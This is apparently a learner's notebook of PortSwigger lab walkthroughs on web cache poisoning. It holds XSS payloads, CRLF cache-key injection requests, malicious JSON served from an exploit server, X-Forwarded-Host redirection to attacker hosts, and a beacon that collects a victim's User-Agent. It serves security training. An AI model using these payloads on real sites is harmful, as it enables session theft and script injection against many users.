Web cache poisoning via an unkeyed query string

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query> 

```
GET /?evil='/><script>alert(1)</script>
```

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query> 

Send until we get a cache hit 
Notice the render has a '/>
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/444517e2-24e6-4bc4-bae0-17f9bb622ac3)




Refresh page on browser to get the alert 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a6a5f1f0-fbca-44e5-a0d0-a6ce5f5d2a20)


Web cache poisoning via an unkeyed query parameter

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param> 

Cache miss whenever you change the query string 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/33404da2-ca80-431a-95e9-ea14f5e21c16)







Found utm parameter and vulnerability using guess param
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ca7cb3f8-cf2d-47e8-b6e2-5e60d79da8f5)

Our payload 
```
/?utm_content='/><script>alert(1)</script>
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/904f9c34-d8bd-4fbd-b0ad-898241275d5a)


Copy url and paste it on your browser
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/774778cb-1de0-4491-beb5-08a2260bc405)







Parameter cloaking

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking> 

Param Miner loaded, right-click on the request and select "Bulk scan" > "Rails parameter cloaking scan" to identify the vulnerability automatically. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b86beea6-19e8-4583-86e3-b013dd2c4c74)





• Observe that every page imports the script /js/geolocate.js, executing the callback function setCountryCookie(). Send the request GET /js/geolocate.js?callback=setCountryCookie to Burp Repeater. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking> 

```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking> 

• Get the response cached, then load the home page in the browser. Check that the alert() is triggered. 
• Replay the request to keep the cache poisoned. The lab will solve when the victim user visits any page containing this resource import URL. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/da2baa8c-6b84-4b39-99eb-b8921a7197ee)


![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/2fa143e6-2c21-4791-8ba6-11e67f436378)








Web cache poisoning via a fat GET request

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get> 


• Observe that every page imports the script /js/geolocate.js, executing the callback function setCountryCookie(). Send the request GET /js/geolocate.js?callback=setCountryCookie to Burp Repeater. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get> 



Notice that you can control the name of the function that is called in the response by passing in a duplicate callback parameter via the request body. Also notice that the cache key is still derived from the original callback parameter in the request line: 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get> 

GET /js/geolocate.js?callback=setCountryCookie

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f989587f-aab2-4eb8-8765-f4cccd30c2ec)







Reflected function
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/260dd6c4-0bcb-40d6-9e22-9aac6f029a43)




Replace with alert(1)
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b82e041a-84df-4bf4-a950-24a1d99d7d32)



Refresh homepage and completed





URL normalization

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization> 

In Burp Repeater, browse to any non-existent path, such as GET /random. Notice that the path you requested is reflected in the error message. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d32a9b86-e82d-4faf-ab42-1e23e0a35ac8)


Add a suitable reflected XSS payload to the request line: 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization> 

```
GET /random</p><script>alert(1)</script><p>foo HTTP/2
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1d41deac-fd71-4e80-a8e1-88699e40f9c6)


Deliver link to victim and you will solve the lab 
```
https://0a72004e045504f580f5df3a0084002d.web-security-academy.net/random</p><script>alert(1)</script><p>foo
```


Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria> 


Identified parameter on 0a7f008c04321b698018496d001b003e.web-security-academy.net: x-forwarded-host~%s.%h
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d6ae158f-bac6-4f9d-aa87-20dfa5005661)








• Add a cache buster to the request, as well as the X-Forwarded-Host header with an arbitrary hostname, such as example.com. Notice that this header overwrites the data.host variable, which is passed into the initGeoLocate() function. 
From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/0a6c5631-6d05-4135-9506-22faa156712e)


• Study the initGeoLocate() function in /resources/js/geolocate.js and notice that it is vulnerable to DOM-XSS due to the way it handles the incoming JSON data. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b2e51429-7f4c-4934-9d11-c0e1b5b36f8b)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/923b7ad9-c8ff-4442-81dc-a8d006da0ec6)








Go to the exploit server and change the file name to match the path used by the vulnerable response: 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria> 

• In the head, add the header Access-Control-Allow-Origin: * to enable CORS 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria> 


In the body, add a malicious JSON object that matches the one used by the vulnerable website. However, replace the value with a suitable XSS payload, for example: 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria> 


```
{
"country": "<img src=1 onerror=alert(document.cookie) />"
}
```


From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/4bb1ea40-6fa7-41ad-9bd7-b44bfab7e2ae)


• In Burp Repeater, add the following header, remembering to enter your own exploit server ID: 
```
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
``` 
• Send the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria> 


• If this doesn't work, notice that the response contains the Set-Cookie header. Responses containing this header are not cacheable on this site. Reload the home page to generate a new request, which should have a session cookie already set. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/cec52c7e-5fdd-4918-9e1c-91247ac88036)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/912d0db0-1639-4441-8a18-c9a34fcd2401)



Combining web cache poisoning vulnerabilities

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities> 


• Use Param Miner to identify that the X-Forwarded-Host and X-Original-URL headers are supported. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities> 


![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/45eac808-7478-4637-a653-19ac226b8e26)



• Notice that the website is vulnerable to DOM-XSS due to the way the initTranslations() function handles data from the JSON file for all languages except English. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities> 


Go to the exploit server and edit the file name to match the path used by the vulnerable website: 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities> 


```
/resources/json/translations.json
```

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/316312a9-9968-436a-894f-1d1151582a4b)







• Go to the exploit server and edit the file name to match the path used by the vulnerable website: 
/resources/json/translations.json 
• In the head, add the header Access-Control-Allow-Origin: * to enable CORS. 
• In the body, add malicious JSON that matches the structure used by the real translation file. Replace the value of one of the translations with a suitable XSS payload, for example: 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7a97982c-58b7-49e6-bc64-d36bc53a1bb8)



```
{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "español",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "</a><img src=1 onerror='alert(document.cookie)' />",
            "Description:": "Descripción"
        }
    }
}
```




For the rest of this solution we will use Spanish to demonstrate the attack. Please note that if you injected your payload into the translation for another language, you will also need to adapt the examples accordingly. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/45f6ad8e-227e-4bd7-b448-09ff93c2efda)


From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities> 

• In Burp, find a GET request for /?localized=1 that includes the lang cookie for Spanish: 
lang=es 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/0dc74a1f-625a-4007-b7c5-b1e643c81e02)









Send the request to Burp Repeater. Add a cache buster and the following header, remembering to enter your own exploit server ID: 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities> 
```
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities> 


![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7e82deef-04f7-4768-8a03-bd6663ef50fb)






• In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Notice that when you change the language on the page to anything other than English, this triggers a redirect, for example, to /setlang/es. The user's selected language is set server side using the lang=es cookie, and the home page is reloaded with the parameter ?localized=1. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a23b83a2-8a26-4e2f-b146-8175f0c3a182)



• If this doesn't work, notice that the response contains the Set-Cookie header. Responses containing this header are not cacheable on this site. Reload the home page to generate a new request, which should have a session cookie already set. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria> 



• Send this new request to Burp Repeater and repeat the steps above until you successfully poison the cache. 
• To simulate the victim, load the URL in the browser and make sure that the alert() fires. 
• Replay the request to keep the cache poisoned until the victim visits the site and the lab is solved 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ddf80af1-c4ce-4741-8793-f084d2f2edce)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a1256dd1-1827-48d3-901d-753cb23f6579)






Cache key injection

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-cache-key-injection> 


Observe that the redirect at /login excludes the parameter utm_content from the cache key using a flawed regex. This allows you append arbitrary unkeyed content to the lang parameter: 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-cache-key-injection> 

```
/login?lang=en?utm_content=anything
```

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-cache-key-injection> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1cd8b20a-4c7e-4db6-a083-aa9e09ab2427)




• Observe that the login page references an endpoint at /js/localize.js that is vulnerable to response header injection via the Origin request header, provided the cors parameter is set to 1. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-cache-key-injection> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f60fff65-c201-4f70-a25e-316f1bfdd41e)





Use the Pragma: x-get-cache-key header to identify that the server is vulnerable to cache key injection, meaning the header injection can be triggered via a crafted URL

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-cache-key-injection> 


Combine these four behaviors by poisoning the cache with following two requests: 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-cache-key-injection> 

```
GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/1.1 Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$ GET /login?lang=en?utm_content=x%26cors=1%26x=1$$Origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/1.1
```

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-cache-key-injection> 




Regular request 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/51cc373f-13ec-4616-b686-d0a83e2ec639)


![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6faba2cc-24f7-4a9d-9ed1-900aa6a19de0)
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/118b5fc9-0194-441d-b9a0-d8db2890a062)





Internal cache poisoning

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/053ec34d-586e-4857-8384-fcab47b93d4f)



Observe that the X-Forwarded-Host header is supported. Add this to your request, containing your exploit server URL: 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal> 

This will allow you to bypass the external cache. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal> 

```
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal> 


• Send the request. If you get lucky with your timing, you will notice that your exploit server URL is reflected three times in the response. However, most of the time, you will see that the URL for the canonical link element and the analytics.js import now both point to your exploit server, but the geolocate.js import URL remains the same. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal> 

• Keep sending the request. Eventually, the URL for the geolocate.js resource will also be overwritten with your exploit server URL. This indicates that this fragment is being cached separately by the internal cache. Notice that you've been getting a cache hit for this fragment even with the cache-buster query parameter - the query string is unkeyed by the internal cache. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal> 


• Remove the X-Forwarded-Host header and resend the request. Notice that the internally cached fragment still reflects your exploit server URL, but the other two URLs do not. This indicates that the header is unkeyed by the internal cache but keyed by the external one. Therefore, you can poison the internally cached fragment using this header. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/0059dd01-62fd-4485-81eb-bb84b1c861ae)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d06d4ca7-9baa-4698-96a6-676032774a08)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f91c1f99-486a-4c5a-b14f-7dc83cc7b4e2)




REMEMBER TO ADD CACHE BUSTER TO BYPASS EXTERNAL CACHE 


Web cache poisoning with an unkeyed cookie

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie> 

first response you received sets the cookie fehost=prod-cache-01
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/28d12d91-67d0-435b-a66f-39cc3a9bdad6)



Change the value of the cookie to an arbitrary string and resend the request. Confirm that this string is reflected in the response

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b43b3496-1b3c-4ed0-93cb-42c3351f7249)




• Place a suitable XSS payload in the fehost cookie, for example: 
```
fehost=someString"-alert(1)-"someString
``` 
• Replay the request until you see the payload in the response and X-Cache: hit in the headers. 
• Load the URL in the browser and confirm the alert() fires. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3b3b32c9-65c3-4894-879f-9468f0658b60)




Web cache poisoning with multiple headers

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers> 



Find the GET request for the JavaScript file /resources/js/tracking.js and send it to Burp Repeater
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ee85386f-4207-4116-a455-b39408d95ca7)


Add a cache-buster query parameter and the X-Forwarded-Host header with an arbitrary hostname, such as example.com. Notice that this doesn't seem to have any effect on the response. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1e81d534-56fa-4002-b323-7a18466019bd)



Remove the X-Forwarded-Host header and add the X-Forwarded-Scheme header instead. Notice that if you include any value other than HTTPS, you receive a 302 response. The Location header shows that you are being redirected to the same URL that you requested, but using https://. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/e7d346c9-cddb-4744-8527-95172968d5ea)







• Go to the exploit server and change the file name to match the path used by the vulnerable response: 
/resources/js/tracking.js 
• In the body, enter the payload alert(document.cookie) and store the exploit. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f846c1bd-aec9-45a8-a1df-b225752e124b)



• Go back to Burp Repeater, remove the cache buster, and resend the request until you poison the cache again. 
• To simulate the victim, reload the home page in the browser and make sure that the alert() fires. 
• Keep replaying the request to keep the cache poisoned until the victim visits the site and the lab is solved. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/254a6fab-226e-49a4-a05d-c872529317d1)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/bd474a62-6078-436c-8557-ca61ad540619)






Targeted web cache poisoning using an unknown header

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header> 

• With the Param Miner extension enabled, right-click on the request and select "Guess headers". After a while, Param Miner will report that there is a secret input in the form of the X-Host header. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header> 


![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ce4e851d-c4ac-408e-bbef-5a1baa8efc08)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/fa1b4baa-2bca-444f-adbd-5c850f37237a)




• Add the X-Host header with an arbitrary hostname, such as example.com. Notice that the value of this header is used to dynamically generate an absolute URL for importing the JavaScript file stored at /resources/js/tracking.js. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/52667a02-04d5-47e8-97bf-a4001d8dabec)




• Go to the exploit server and change the file name to match the path used by the vulnerable response: 
/resources/js/tracking.js 
• In the body, enter the payload alert(document.cookie) and store the exploit. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header> 


• Go back to the request in Burp Repeater and set the X-Host header as follows, remembering to add your own exploit server ID: 
```
X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
``` 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header> 

• Go back to the request in Burp Repeater and set the X-Host header as follows, remembering to add your own exploit server ID: 
```
X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
``` 
• Send the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers. 
• To simulate the victim, load the URL in the browser and make sure that the alert() fires. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/59a6313c-e56b-4e03-a6ac-e5e65e32c2b4)



• Notice that the Vary header is used to specify that the User-Agent is part of the cache key. To target the victim, you need to find out their User-Agent. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/77f6bdba-fb82-4e75-9c3d-127305f8c182)



• On the website, notice that the comment feature allows certain HTML tags. Post a comment containing a suitable payload to cause the victim's browser to interact with your exploit server, for example: 
```
<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
``` 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7c957cb9-0c66-4480-a37b-40a9ff1e6008)






• Go to the exploit server and click the button to open the "Access log". Refresh the page every few seconds until you see requests made by a different user. This is the victim. Copy their User-Agent from the log. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8182b7e2-f01c-47db-bd80-f0c1fd4d145e)



• Go back to your malicious request in Burp Repeater and paste the victim's User-Agent into the corresponding header. Remove the cache buster. 

From <https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9654ead3-5781-4f16-a586-7dd5bba6fbca)
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/540c0606-e4a5-4157-942b-f70b74e7cd16)










